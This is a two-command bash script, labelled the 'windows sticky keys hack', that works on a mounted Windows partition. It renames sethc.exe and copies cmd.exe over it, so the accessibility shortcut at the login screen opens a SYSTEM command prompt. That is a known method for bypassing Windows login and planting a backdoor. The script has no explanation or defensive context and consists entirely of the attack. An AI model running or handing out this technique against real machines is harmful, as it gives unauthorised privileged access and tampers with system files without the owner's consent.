#!/bin/bash
#execute the windows sticky keys hack

mv "/media/windows/Windows/System32/sethc.exe" "/media/windows/Windows/System32/sethcold.exe"
cp "/media/windows/Windows/System32/cmd.exe" "/media/windows/Windows/System32/sethc.exe"